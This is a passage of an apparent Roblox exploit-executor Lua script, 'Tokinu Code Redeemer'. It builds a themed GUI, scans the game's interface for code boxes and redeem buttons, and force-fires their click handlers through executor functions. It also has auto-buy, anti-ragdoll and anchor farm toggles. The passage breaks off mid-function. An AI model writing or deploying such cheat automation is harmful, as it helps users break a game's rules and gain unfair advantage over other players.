-- =====================================================================
-- TOKINU CODE REDEEMER
-- Watches notifications for code phrases, captures words, types them
-- into the redemption UI, and submits. Includes trait farm utilities.
-- =====================================================================

-- ─── Services ─────────────────────────────────────────────────────────
local Players           = game:GetService("Players")
local RunService        = game:GetService("RunService")
local Stats             = game:GetService("Stats")
local UserInputService  = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService      = game:GetService("TweenService")
local Workspace         = game:GetService("Workspace")

local player    = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- =====================================================================
-- CONFIG PERSISTENCE — load/save simple key=value text file
-- =====================================================================
local CONFIG_FILE = "tokinu_cfg.txt"
local config = {}

-- ─── loadConfig: read saved settings from disk into `config` ──────────
local function loadConfig()
    config = {}
    if readfile and isfile then
        local ok, txt = pcall(function()
            if isfile(CONFIG_FILE) then return readfile(CONFIG_FILE) end
        end)
        if ok and type(txt) == "string" then
            -- Parse each "key=value" line
            for line in txt:gmatch("[^\n]+") do
                local k, v = line:match("^(%w+)=(.*)$")
                if k then config[k] = v end
            end
        end
    end
end

-- ─── saveConfig: persist all `config` entries, sorted for stability ───
local function saveConfig()
    if writefile then
        local lines = {}
        for k, v in pairs(config) do
            lines[#lines + 1] = tostring(k) .. "=" .. tostring(v)
        end
        table.sort(lines)   -- deterministic file layout
        pcall(writefile, CONFIG_FILE, table.concat(lines, "\n"))
    end
end

-- ─── cfgBool: read a boolean setting ("1"=true / "0"=false) ───────────
local function cfgBool(key, def)
    local v = config[key]
    if v == "1" then return true end
    if v == "0" then return false end
    return def
end

-- ─── cfgNum: read a numeric setting ───────────────────────────────────
local function cfgNum(key, def)
    local v = tonumber(config[key])
    if v then return v end
    return def
end

-- ─── cfgSet: write a setting (booleans serialized as "1"/"0") ─────────
local function cfgSet(key, val)
    if type(val) == "boolean" then
        config[key] = val and "1" or "0"
    else
        config[key] = tostring(val)
    end
end

loadConfig()   -- apply persisted settings at startup

-- ─── UI parent (gethui if available, else CoreGui) ────────────────────
local parent = (gethui and gethui() or game:GetService("CoreGui"))
local old = parent:FindFirstChild("TokinuCodeRedeemer")
if old then old:Destroy() end   -- remove previous instance if re-executed

-- =====================================================================
-- RUNTIME STATE
-- =====================================================================
local running     = false                -- redeemer active flag
local autoOn      = cfgBool("autoOn", true)    -- auto-start on trigger
local wordsValues = {1, 2, 3, 4}         -- selectable word-count options
local wordsIndex  = cfgNum("wordsIndex", 3)    -- current selected index
if wordsIndex < 1 or wordsIndex > 4 then wordsIndex = 3 end   -- clamp
local soundsOn    = cfgBool("soundsOn", true)  -- sound toggle (flag only)
local redeem3On   = cfgBool("redeem3On", true) -- redeem-3 fallback flag

-- Capture buffers
local _seen          = {}       -- dedupe map for submitted codes
local _capturedParts = {}       -- words captured so far
local _lastBox       = nil      -- last used codebox (for clearing)
local _submitting    = false    -- guards re-entrancy during submit

-- Auto Buy (proximity prompt farm)
local autoBuyEnabled       = cfgBool("autoBuyEnabled", false)
local autoBuyPrompts       = {}       -- set of known prompts
local autoBuyAccum         = 0        -- dt accumulator
local autoBuyLastFired     = nil      -- last fired prompt
local autoBuyLastFiredTime = 0        -- timestamp of last fire

-- Anchor (freeze character in place)
local anchorEnabled = cfgBool("anchorEnabled", false)
local anchorAccum   = 0

-- Anti-ragdoll
local ragdollEnabled = cfgBool("ragdollEnabled", false)

-- Redeem-response tracker
local _redeemStatus       = nil       -- "redeeming" | "success" | "failed"
local _redeemPendingCode  = nil
local _redeemOriginalCode = nil
local _redeemStartTime    = 0

-- =====================================================================
-- REDEEM RESPONSE PATTERNS
-- =====================================================================
local SUCCESS_PATTERNS = {
    "successfully redeemed",
    "redeemed successfully",
    "code redeemed",
    "code has been redeemed",
    "code accepted",
    "code activated",
    "code is valid",
    "valid code",
    "you redeemed",
    "you have redeemed",
    "success!",
    "reward claimed",
    "you got the",
}

local FAIL_PATTERNS = {
    "invalid code",
    "code is invalid",
    "code invalid",
    "code is not valid",
    "not a valid code",
    "expired code",
    "code expired",
    "code has expired",
    "code is expired",
    "already redeemed",
    "already used",
    "already been used",
    "already been redeemed",
    "you already used",
    "you already redeemed",
    "unknown code",
    "code not found",
    "code doesn't exist",
    "code does not exist",
    "wrong code",
    "incorrect code",
    "code is incorrect",
}

-- ─── getWordCount: currently selected fragment count ─────────────────
local function getWordCount() return wordsValues[wordsIndex] end

-- =====================================================================
-- ROOT GUI
-- =====================================================================
local v1 = Instance.new("ScreenGui")
v1.Name = "TokinuCodeRedeemer"
v1.ResetOnSpawn = false
v1.IgnoreGuiInset = true
v1.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
v1.ScreenInsets = Enum.ScreenInsets.DeviceSafeInsets

-- Tab-selected event bus (fires name of newly selected tab)
local v2 = Instance.new("BindableEvent")
v2.Name = "TabSelected"
v2.Parent = v1

-- Saved window position
local guiPosXScale  = cfgNum("guiXScale", 0.5)
local guiPosXOffset = cfgNum("guiXOffset", 251)
local guiPosYScale  = cfgNum("guiYScale", 0.5)
local guiPosYOffset = cfgNum("guiYOffset", 60)

-- Main window frame (draggable)
local v3 = Instance.new("Frame")
v3.Name = "TokinuWindow"
v3.Active = true
v3.AnchorPoint = Vector2.new(0.5, 0.5)
v3.BackgroundTransparency = 1
v3.Position = UDim2.new(guiPosXScale, guiPosXOffset, guiPosYScale, guiPosYOffset)
v3.Size = UDim2.new(0, 545, 0, 530)
v3.Parent = v1

-- Global UI scale
local ModeScale = Instance.new("UIScale")
ModeScale.Name = "ModeScale"
ModeScale.Scale = 0.44999998807907104
ModeScale.Parent = v3

-- Body panel (below header)
local v4 = Instance.new("Frame")
v4.Name = "Body"
v4.BackgroundColor3 = Color3.fromRGB(169, 90, 59)
v4.BackgroundTransparency = 0.45
v4.Position = UDim2.new(0, 0, 0, 72)
v4.Size = UDim2.new(1, 0, 1, -72)
v4.Parent = v3

-- Header panel
local v5 = Instance.new("Frame")
v5.Name = "Header"
v5.Active = true
v5.BackgroundTransparency = 1
v5.ClipsDescendants = true
v5.Size = UDim2.new(1, 0, 0, 72)
v5.Parent = v3

-- Header background image
local v6 = Instance.new("ImageLabel")
v6.AnchorPoint = Vector2.new(0.5, 0.5)
v6.BackgroundTransparency = 1
v6.ClipsDescendants = true
v6.Position = UDim2.new(0.5, 0, 0.5, 0)
v6.Size = UDim2.new(1, 0, 1, 0)
v6.Image = "rbxassetid://137573329562191"
v6.ScaleType = Enum.ScaleType.Fit
v6.Parent = v5

-- Header tiled texture
local v7 = Instance.new("ImageLabel")
v7.AnchorPoint = Vector2.new(0.5, 0.5)
v7.BackgroundTransparency = 1
v7.Position = UDim2.new(0.5, 0, 0.425, 0)
v7.Size = UDim2.new(2, 0, 2, 0)
v7.Image = "rbxassetid://102515727422321"
v7.ScaleType = Enum.ScaleType.Tile
v7.TileSize = UDim2.new(0.35, 0, 1, 0)
v7.Parent = v6

-- Pumpkin deco 1
local v8 = Instance.new("ImageLabel")
v8.AnchorPoint = Vector2.new(0.5, 0.5)
v8.BackgroundTransparency = 1
v8.Position = UDim2.new(0.668, 0, 0.586, 0)
v8.Rotation = 25
v8.Size = UDim2.new(0.14, 0, 1.289, 0)
v8.ZIndex = 2
v8.Image = "rbxassetid://76851378401687"
v8.ScaleType = Enum.ScaleType.Fit
v8.Parent = v6

-- Pumpkin deco 2
local v9 = Instance.new("ImageLabel")
v9.AnchorPoint = Vector2.new(0.5, 0.5)
v9.BackgroundTransparency = 1
v9.Position = UDim2.new(0.754, 0, 0.689, 0)
v9.Rotation = -5
v9.Size = UDim2.new(0.102, 0, 0.961, 0)
v9.ZIndex = 3
v9.Image = "rbxassetid://76851378401687"
v9.ScaleType = Enum.ScaleType.Fit
v9.Parent = v6

-- Pumpkin deco 3
local v10 = Instance.new("ImageLabel")
v10.AnchorPoint = Vector2.new(0.5, 0.5)
v10.BackgroundTransparency = 1
v10.Position = UDim2.new(0.84, 0, 0.875, 0)
v10.Rotation = -3
v10.Size = UDim2.new(0.09, 0, 1.176, 0)
v10.ZIndex = 4
v10.Image = "rbxassetid://95171315517545"
v10.ScaleType = Enum.ScaleType.Fit
v10.Parent = v6

-- Title label
local v11 = Instance.new("TextLabel")
v11.BackgroundTransparency = 1
v11.Size = UDim2.new(1, 0, 0, 44)
v11.ZIndex = 5
v11.FontFace = Font.new("rbxasset://fonts/families/Montserrat.json", Enum.FontWeight.Heavy)
v11.Text = "Tokinu Code Redeemer"
v11.TextColor3 = Color3.fromRGB(255, 255, 255)
v11.TextSize = 34
v11.TextXAlignment = Enum.TextXAlignment.Left
v11.Parent = v5
local v12 = Instance.new("UIStroke"); v12.Thickness = 2; v12.Parent = v11
local v13 = Instance.new("UIPadding"); v13.PaddingLeft = UDim.new(0, 12); v13.Parent = v11

-- Subtitle label
local v14 = Instance.new("TextLabel")
v14.BackgroundTransparency = 1
v14.Position = UDim2.new(0, 0, 0, 42)
v14.Size = UDim2.new(1, 0, 0, 22)
v14.ZIndex = 5
v14.FontFace = Font.new("rbxasset://fonts/families/Montserrat.json", Enum.FontWeight.ExtraBold)
v14.Text = "Script Any Codes Using This!"
v14.TextColor3 = Color3.fromRGB(201, 201, 201)
v14.TextSize = 19
v14.TextXAlignment = Enum.TextXAlignment.Left
v14.Parent = v5
local v15 = Instance.new("UIStroke"); v15.Thickness = 2; v15.Parent = v14
local v16 = Instance.new("UIPadding"); v16.PaddingLeft = UDim.new(0, 12); v16.Parent = v14

-- Close (X) button
local v17 = Instance.new("TextButton")
v17.AnchorPoint = Vector2.new(0.5, 0.5)
v17.BackgroundColor3 = Color3.fromRGB(47, 37, 41)
v17.Position = UDim2.new(0, 513, 0, 30)
v17.Size = UDim2.new(0, 44, 0, 44)
v17.ZIndex = 6
v17.AutoButtonColor = false
v17.Text = ""
v17.Parent = v5
local v18 = Instance.new("Frame"); v18.BackgroundColor3 = Color3.fromRGB(145, 39, 39); v18.Position = UDim2.new(0,2,0,2); v18.Size = UDim2.new(1,-4,1,-4); v18.Parent = v17
local v19 = Instance.new("TextLabel"); v19.BackgroundTransparency = 1; v19.Size = UDim2.new(1,0,1,0); v19.FontFace = Font.new("rbxasset://fonts/families/Montserrat.json", Enum.FontWeight.Heavy); v19.Text = "x"; v19.TextColor3 = Color3.fromRGB(255,255,255); v19.TextSize = 26; v19.Parent = v17
local v20 = Instance.new("UIStroke"); v20.Thickness = 2; v20.Parent = v19

-- =====================================================================
-- UI FACTORY HELPERS
-- =====================================================================

-- ─── makeTab: build a top tab button and return button+fill ──────────
local function makeTab(name, posX, fillColor)
    local btn = Instance.new("TextButton")
    btn.AnchorPoint = Vector2.new(0.5, 0.5)
    btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    btn.Position = UDim2.new(0, posX, 0, 111)
    btn.Size = UDim2.new(0, 166, 0, 58)
    btn.AutoButtonColor = false
    btn.Text = ""
    btn.Parent = v3
    local fill = Instance.new("Frame")
    fill.BackgroundColor3 = fillColor
    fill.Position = UDim2.new(0, 1, 0, 1)
    fill.Size = UDim2.new(1, -2, 1, -2)
    fill.Parent = btn
    local lbl = Instance.new("TextLabel")
    lbl.BackgroundTransparency = 1
    lbl.Size = UDim2.new(1, 0, 1, 0)
    lbl.FontFace = Font.new("rbxasset://fonts/families/Montserrat.json", Enum.FontWeight.Heavy)
    lbl.Text = name
    lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
    lbl.TextSize = 30
    lbl.Parent = btn
    local s = Instance.new("UIStroke"); s.Thickness = 2; s.Parent = lbl
    return btn, fill
end

-- Instantiate the three tabs
local RedeemerTab,  RedeemerFill  = makeTab("Redeemer",   93, Color3.fromRGB(196, 92, 0))
local TraitFarmTab, TraitFarmFill = makeTab("Trait Farm", 267, Color3.fromRGB(255, 145, 25))
local SettingsTab,  SettingsFill  = makeTab("Settings",   441, Color3.fromRGB(255, 145, 25))

-- ─── Pages (content containers) ──────────────────────────────────────
local RedeemerPage = Instance.new("Frame")
RedeemerPage.BackgroundTransparency = 1
RedeemerPage.Position = UDim2.new(0, 0, 0, 150)
RedeemerPage.Size = UDim2.new(1, 0, 1, -150)
RedeemerPage.Parent = v3

local SettingsPage = Instance.new("Frame")
SettingsPage.BackgroundTransparency = 1
SettingsPage.Position = UDim2.new(0, 0, 0, 150)
SettingsPage.Size = UDim2.new(1, 0, 1, -150)
SettingsPage.Visible = false
SettingsPage.Parent = v3

local TraitFarmPage = Instance.new("Frame")
TraitFarmPage.BackgroundTransparency = 1
TraitFarmPage.Position = UDim2.new(0, 0, 0, 150)
TraitFarmPage.Size = UDim2.new(1, 0, 1, -150)
TraitFarmPage.Visible = false
TraitFarmPage.Parent = v3

-- ─── makeRow: labeled row card ───────────────────────────────────────
local function makeRow(parent, y, title, textSize)
    local row = Instance.new("Frame")
    row.BackgroundColor3 = Color3.fromRGB(33, 43, 50)
    row.Position = UDim2.new(0, 10, 0, y)
    row.Size = UDim2.new(1, -20, 0, 68)
    row.Parent = parent
    local st = Instance.new("UIStroke"); st.ApplyStrokeMode = Enum.ApplyStrokeMode.Border; st.Parent = row
    local lbl = Instance.new("TextLabel")
    lbl.BackgroundTransparency = 1
    lbl.Size = UDim2.new(1, 0, 1, 0)
    lbl.FontFace = Font.new("rbxasset://fonts/families/Montserrat.json", Enum.FontWeight.Heavy)
    lbl.Text = title
    lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
    lbl.TextSize = textSize or 30
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.Parent = row
    local ls = Instance.new("UIStroke"); ls.Thickness = 2; ls.Parent = lbl
    local pad = Instance.new("UIPadding"); pad.PaddingLeft = UDim.new(0, 16); pad.Parent = lbl
    return row, lbl
end

-- ─── makeToggleButton: on/off toggle button factory ──────────────────
local function makeToggleButton(parent, x, labelText, fillColor)
    local btn = Instance.new("TextButton")
    btn.AnchorPoint = Vector2.new(0.5, 0.5)
    btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    btn.Position = UDim2.new(0, x, 0, 34)
    btn.Size = UDim2.new(0, 100, 0, 46)
    btn.AutoButtonColor = false
    btn.Text = ""
    btn.Parent = parent
    local fill = Instance.new("Frame")
    fill.BackgroundColor3 = fillColor
    fill.Position = UDim2.new(0, 1, 0, 1)
    fill.Size = UDim2.new(1, -2, 1, -2)
    fill.Parent = btn
    local lbl = Instance.new("TextLabel")
    lbl.BackgroundTransparency = 1
    lbl.Size = UDim2.new(1, 0, 1, 0)
    lbl.FontFace = Font.new("rbxasset://fonts/families/Montserrat.json", Enum.FontWeight.Heavy)
    lbl.Text = labelText
    lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
    lbl.TextSize = 26
    lbl.Parent = btn
    local s = Instance.new("UIStroke"); s.Thickness = 2; s.Parent = lbl
    return btn, fill, lbl
end

-- =====================================================================
-- REDEEMER PAGE — word-count buttons + status + start/stop
-- =====================================================================
local RedRow1 = makeRow(RedeemerPage, 0, "Words")
local WordsButtons, WordsFills = {}, {}
-- Create the four word-count buttons (1..4)
for i = 1, 4 do
    local x = 277 + (i - 1) * 68
    local btn = Instance.new("TextButton")
    btn.AnchorPoint = Vector2.new(0.5, 0.5)
    btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    btn.Position = UDim2.new(0, x, 0, 34)
    btn.Size = UDim2.new(0, 60, 0, 46)
    btn.AutoButtonColor = false
    btn.Text = ""
    btn.Parent = RedRow1
    local fill = Instance.new("Frame")
    fill.BackgroundColor3 = Color3.fromRGB(255, 145, 25)
    fill.Position = UDim2.new(0, 1, 0, 1)
    fill.Size = UDim2.new(1, -2, 1, -2)
    fill.Parent = btn
    local lbl = Instance.new("TextLabel")
    lbl.BackgroundTransparency = 1
    lbl.Size = UDim2.new(1, 0, 1, 0)
    lbl.FontFace = Font.new("rbxasset://fonts/families/Montserrat.json", Enum.FontWeight.Heavy)
    lbl.Text = tostring(i)
    lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
    lbl.TextSize = 28
    lbl.Parent = btn
    local s = Instance.new("UIStroke"); s.Thickness = 2; s.Parent = lbl
    WordsButtons[i] = btn
    WordsFills[i] = fill
end

-- Status row ("Redeemer: Enabled/Disabled")
local RedRow2, RedeemerStatusLabel = makeRow(RedeemerPage, 76, "Redeemer: Disabled")
RedeemerStatusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)

-- Start / Stop button
local StartStopBtn = Instance.new("TextButton")
StartStopBtn.AnchorPoint = Vector2.new(0.5, 0.5)
StartStopBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
StartStopBtn.Position = UDim2.new(0, 431, 0, 34)
StartStopBtn.Size = UDim2.new(0, 160, 0, 46)
StartStopBtn.AutoButtonColor = false
StartStopBtn.Text = ""
StartStopBtn.Parent = RedRow2
local StartStopFill = Instance.new("Frame")
StartStopFill.BackgroundColor3 = Color3.fromRGB(145, 39, 39)
StartStopFill.Position = UDim2.new(0, 1, 0, 1)
StartStopFill.Size = UDim2.new(1, -2, 1, -2)
StartStopFill.Parent = StartStopBtn
local StartStopLabel = Instance.new("TextLabel")
StartStopLabel.BackgroundTransparency = 1
StartStopLabel.Size = UDim2.new(1, 0, 1, 0)
StartStopLabel.FontFace = Font.new("rbxasset://fonts/families/Montserrat.json", Enum.FontWeight.Heavy)
StartStopLabel.Text = "OFF [F]"
StartStopLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
StartStopLabel.TextSize = 20
StartStopLabel.Parent = StartStopBtn
local ss = Instance.new("UIStroke"); ss.Thickness = 2; ss.Parent = StartStopLabel

-- Progress row (shows N/M word capture)
local ProgressRow, ProgressLabel = makeRow(RedeemerPage, 152, "0/" .. tostring(getWordCount()))

-- Auto Detect toggle row
local RedRow4 = makeRow(RedeemerPage, 228, "Auto Detect")
local AutoDetectBtn, AutoDetectFill, AutoDetectLabel = makeToggleButton(RedRow4, 461, "ON", Color3.fromRGB(196, 92, 0))

-- Code display strip (shows current/result code text)
local CodeDisplay = Instance.new("Frame")
CodeDisplay.BackgroundColor3 = Color3.fromRGB(196, 92, 0)
CodeDisplay.Position = UDim2.new(0, 10, 0, 304)
CodeDisplay.Size = UDim2.new(1, -20, 0, 50)
CodeDisplay.Parent = RedeemerPage
local cds = Instance.new("UIStroke"); cds.ApplyStrokeMode = Enum.ApplyStrokeMode.Border; cds.Thickness = 2; cds.Parent = CodeDisplay
local CodeDisplayLabel = Instance.new("TextLabel")
CodeDisplayLabel.BackgroundTransparency = 1
CodeDisplayLabel.Size = UDim2.new(1, 0, 1, 0)
CodeDisplayLabel.FontFace = Font.new("rbxasset://fonts/families/Montserrat.json", Enum.FontWeight.Heavy)
CodeDisplayLabel.Text = "Code Will Show Here"
CodeDisplayLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
CodeDisplayLabel.TextSize = 30
CodeDisplayLabel.Parent = CodeDisplay
local cds2 = Instance.new("UIStroke"); cds2.Thickness = 2; cds2.Parent = CodeDisplayLabel

-- =====================================================================
-- SETTINGS PAGE
-- =====================================================================
local SetRow1 = makeRow(SettingsPage, 0, "Sounds")
local SoundsBtn, SoundsFill, SoundsLabel = makeToggleButton(SetRow1, 461, "ON", Color3.fromRGB(196, 92, 0))
local SetRow2 = makeRow(SettingsPage, 76, "Redeem 3 if 4 wrong", 26)
local Redeem3Btn, Redeem3Fill, Redeem3Label = makeToggleButton(SetRow2, 461, "ON", Color3.fromRGB(196, 92, 0))

-- =====================================================================
-- TRAIT FARM PAGE
-- =====================================================================
local TF1 = makeRow(TraitFarmPage, 0, "Auto Buy")
local TF1Btn, TF1Fill, TF1Lbl = makeToggleButton(TF1, 461, "OFF", Color3.fromRGB(255, 145, 25))
local TF2 = makeRow(TraitFarmPage, 76, "Anchor")
local TF2Btn, TF2Fill, TF2Lbl = makeToggleButton(TF2, 461, "OFF", Color3.fromRGB(255, 145, 25))
local TF3 = makeRow(TraitFarmPage, 152, "Anti Ragdoll")
local TF3Btn, TF3Fill, TF3Lbl = makeToggleButton(TF3, 461, "OFF", Color3.fromRGB(255, 145, 25))
local TF4 = makeRow(TraitFarmPage, 228, "Anti Lag")
local TF4Btn, TF4Fill, TF4Lbl = makeToggleButton(TF4, 461, "OFF", Color3.fromRGB(255, 145, 25))

-- =====================================================================
-- HUD HOLDER — small floating toggle icon (mini launcher)
-- =====================================================================
local HudHolder = Instance.new("Frame")
HudHolder.AnchorPoint = Vector2.new(0.5, 0.5)
HudHolder.BackgroundTransparency = 1
HudHolder.Position = UDim2.new(0, 1061, 0, 222)
HudHolder.Size = UDim2.new(0, 89, 0, 89)
HudHolder.ZIndex = 10
HudHolder.Parent = v1
local HudScale = Instance.new("UIScale"); HudScale.Scale = 0.5; HudScale.Parent = HudHolder

local ToggleButton = Instance.new("TextButton")
ToggleButton.AnchorPoint = Vector2.new(0.5, 0.5)
ToggleButton.BackgroundTransparency = 1
ToggleButton.Position = UDim2.new(0.5, 0, 0.5, 0)
ToggleButton.Size = UDim2.new(0, 89, 0, 89)
ToggleButton.AutoButtonColor = false
ToggleButton.Text = ""
ToggleButton.Parent = HudHolder

local Edge = Instance.new("Frame")
Edge.BackgroundTransparency = 1
Edge.Position = UDim2.new(0, 2, 0, 2)
Edge.Size = UDim2.new(1, -4, 1, -4)
Edge.Parent = ToggleButton
local EdgeStroke = Instance.new("UIStroke")
EdgeStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
EdgeStroke.Thickness = 2
EdgeStroke.Parent = Edge

local Face = Instance.new("Frame")
Face.BackgroundColor3 = Color3.fromRGB(255, 140, 0)
Face.ClipsDescendants = true
Face.Position = UDim2.new(0, 4, 0, 4)
Face.Size = UDim2.new(1, -8, 1, -8)
Face.Parent = ToggleButton

local HImg = Instance.new("ImageLabel")
HImg.AnchorPoint = Vector2.new(0.5, 0.5)
HImg.BackgroundTransparency = 1
HImg.Position = UDim2.new(0.5, 0, 0.5, 0)
HImg.Size = UDim2.new(1, 0, 1, 0)
HImg.Image = "rbxassetid://137573329562191"
HImg.ScaleType = Enum.ScaleType.Crop
HImg.Parent = Face

local Bat = Instance.new("ImageLabel")
Bat.AnchorPoint = Vector2.new(0.5, 0.5)
Bat.BackgroundTransparency = 1
Bat.Position = UDim2.new(0.5, 0, 0.5, 0)
Bat.Size = UDim2.new(2, 0, 2, 0)
Bat.Image = "rbxassetid://102515727422321"
Bat.ScaleType = Enum.ScaleType.Tile
Bat.TileSize = UDim2.new(0.5, 0, 0.5, 0)
Bat.Parent = Face

local Pumpkin = Instance.new("ImageLabel")
Pumpkin.AnchorPoint = Vector2.new(0.5, 0.5)
Pumpkin.BackgroundTransparency = 1
Pumpkin.Position = UDim2.new(0.5, 0, 0, 40)
Pumpkin.Size = UDim2.new(0, 52, 0, 52)
Pumpkin.Image = "rbxassetid://76851378401687"
Pumpkin.ScaleType = Enum.ScaleType.Fit
Pumpkin.Parent = ToggleButton

local Candy = Instance.new("TextLabel")
Candy.AnchorPoint = Vector2.new(0.5, 0.5)
Candy.BackgroundTransparency = 1
Candy.Position = UDim2.new(0, 12, 0, 8)
Candy.Rotation = 70
Candy.Size = UDim2.new(0, 34, 0, 34)
Candy.ZIndex = 5
Candy.Text = "🍬"
Candy.TextSize = 30
Candy.Parent = ToggleButton

local HLbl = Instance.new("TextLabel")
HLbl.AnchorPoint = Vector2.new(0.5, 0.5)
HLbl.BackgroundTransparency = 1
HLbl.Position = UDim2.new(0.5, 0, 0, 83)
HLbl.Size = UDim2.new(1, 20, 0, 26)
HLbl.FontFace = Font.new("rbxasset://fonts/families/Montserrat.json", Enum.FontWeight.ExtraBold)
HLbl.Text = "Tokinu"
HLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
HLbl.TextSize = 22
HLbl.Parent = ToggleButton
local HLblS = Instance.new("UIStroke"); HLblS.Thickness = 2; HLblS.Parent = HLbl

-- =====================================================================
-- WINDOW SHOW/HIDE + DRAG
-- =====================================================================
local guiVisible = true
-- Click the HUD icon to toggle main window
ToggleButton.MouseButton1Click:Connect(function()
    guiVisible = not guiVisible
    v3.Visible = guiVisible
end)
-- Close button on header hides the window
v17.MouseButton1Click:Connect(function()
    guiVisible = false
    v3.Visible = false
end)

-- ─── Drag on header ──────────────────────────────────────────────────
local dragging, dragStart, startPos
v5.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = v3.Position
        local c
        c = input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
                if c then c:Disconnect() end
                -- Save final position
                cfgSet("guiXScale", v3.Position.X.Scale)
                cfgSet("guiXOffset", v3.Position.X.Offset)
                cfgSet("guiYScale", v3.Position.Y.Scale)
                cfgSet("guiYOffset", v3.Position.Y.Offset)
                saveConfig()
            end
        end)
    end
end)
-- Apply drag delta while mouse/touch moves
UserInputService.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local d = input.Position - dragStart
        v3.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
    end
end)

-- =====================================================================
-- TAB SWITCHING
-- =====================================================================
local ACTIVE = Color3.fromRGB(196, 92, 0)
local INACTIVE = Color3.fromRGB(255, 145, 25)
local function selectTab(which)
    -- Hide all pages, set all tabs inactive
    RedeemerPage.Visible  = false
    SettingsPage.Visible  = false
    TraitFarmPage.Visible = false
    RedeemerFill.BackgroundColor3  = INACTIVE
    TraitFarmFill.BackgroundColor3 = INACTIVE
    SettingsFill.BackgroundColor3  = INACTIVE
    -- Show the selected page
    if which == "Redeemer" then
        RedeemerPage.Visible = true
        RedeemerFill.BackgroundColor3 = ACTIVE
    elseif which == "TraitFarm" then
        TraitFarmPage.Visible = true
        TraitFarmFill.BackgroundColor3 = ACTIVE
    elseif which == "Settings" then
        SettingsPage.Visible = true
        SettingsFill.BackgroundColor3 = ACTIVE
    end
    v2:Fire(which)   -- notify listeners
end
RedeemerTab.MouseButton1Click:Connect(function() selectTab("Redeemer") end)
TraitFarmTab.MouseButton1Click:Connect(function() selectTab("TraitFarm") end)
SettingsTab.MouseButton1Click:Connect(function() selectTab("Settings") end)
selectTab("Redeemer")   -- default tab

-- =====================================================================
-- TOGGLE WRAPPER
-- =====================================================================
local ON_COLOR  = Color3.fromRGB(39, 145, 39)
local OFF_COLOR = Color3.fromRGB(145, 39, 39)

-- ─── makeToggle: attach on/off behavior to a button ──────────────────
local function makeToggle(button, fill, label, initial, onChange)
    local state = initial
    local function render()
        fill.BackgroundColor3 = state and ON_COLOR or OFF_COLOR
        label.Text = state and "ON" or "OFF"
    end
    render()
    button.MouseButton1Click:Connect(function()
        state = not state
        render()
        if onChange then onChange(state) end
    end)
    return function() return state end
end

-- =====================================================================
-- WORD-COUNT BUTTON SELECTION
-- =====================================================================
local SELECTED_COLOR   = Color3.fromRGB(196, 92, 0)
local UNSELECTED_COLOR = Color3.fromRGB(255, 145, 25)

-- ─── renderWords: sync button colors + progress label ────────────────
local function renderWords()
    for i = 1, 4 do
        WordsFills[i].BackgroundColor3 = (i == wordsIndex) and SELECTED_COLOR or UNSELECTED_COLOR
    end
    ProgressLabel.Text = tostring(#_capturedParts) .. "/" .. tostring(getWordCount())
end
renderWords()
-- Wire each word-count button
for i = 1, 4 do
    WordsButtons[i].MouseButton1Click:Connect(function()
        wordsIndex = i
        cfgSet("wordsIndex", i)
        saveConfig()
        renderWords()
    end)
end

-- =====================================================================
-- UI SCANNING HELPERS
-- =====================================================================
-- ─── isOurGui: is this instance inside our own ScreenGui? ────────────
local function isOurGui(instance)
    local p = instance
    for _ = 1, 10 do
        if not p then break end
        if p.Name == "TokinuCodeRedeemer" then return true end
        p = p.Parent
    end
    return false
end

-- ─── isVisibleChain: every ancestor is visible+enabled ───────────────
local function isVisibleChain(inst)
    local current = inst
    while current do
        if current:IsA("GuiObject") and not current.Visible then return false end
        if current:IsA("ScreenGui") then return current.Enabled end
        current = current.Parent
    end
    return true
end

-- ─── findAllTextBoxes: all visible TextBoxes in PlayerGui ────────────
local function findAllTextBoxes(pg)
    local boxes = {}
    for _, g in ipairs(pg:GetChildren()) do
        if g:IsA("ScreenGui") and g.Enabled and not isOurGui(g) then
            for _, d in ipairs(g:GetDescendants()) do
                if d:IsA("TextBox") and not isOurGui(d) then
                    boxes[#boxes + 1] = d
                end
            end
        end
    end
    return boxes
end

-- ─── findCodeButtons: buttons whose name/parent hints "code"/"redeem"
local function findCodeButtons(pg)
    local btns = {}
    for _, g in ipairs(pg:GetChildren()) do
        if g:IsA("ScreenGui") and g.Enabled and not isOurGui(g) then
            for _, d in ipairs(g:GetDescendants()) do
                if (d:IsA("TextButton") or d:IsA("ImageButton")) and not isOurGui(d) then
                    local n = d.Name:lower()
                    local pn = (d.Parent and d.Parent.Name or ""):lower()
                    if (n:find("code") or n:find("redeem") or pn:find("code") or pn:find("redeem"))
                        and isVisibleChain(d) then
                        btns[#btns + 1] = d
                    end
                end
            end
        end
    end
    return btns
end

-- ─── clickButton: fire every click method available ──────────────────
local function clickButton(btn)
    if not btn then return false end
    pcall(function() btn.MouseButton1Click:Fire() end)
    pcall(function() btn.Activated:Fire() end)
    if typeof(firesignal) == "function" then
        pcall(firesignal, btn.MouseButton1Click)
        pcall(firesignal, btn.Activated)
    end
    if typeof(getconnections) == "function" then
        local ok, cs = pcall(getconnections, btn.MouseButton1Click)
        if ok and type(cs) == "table" then
            for _, c in ipairs(cs) do pcall(function() c:Fire() end) end
        end
        local ok2, cs2 = pcall(getconnections, btn.Activated)
        if ok2 and type(cs2) == "table" then
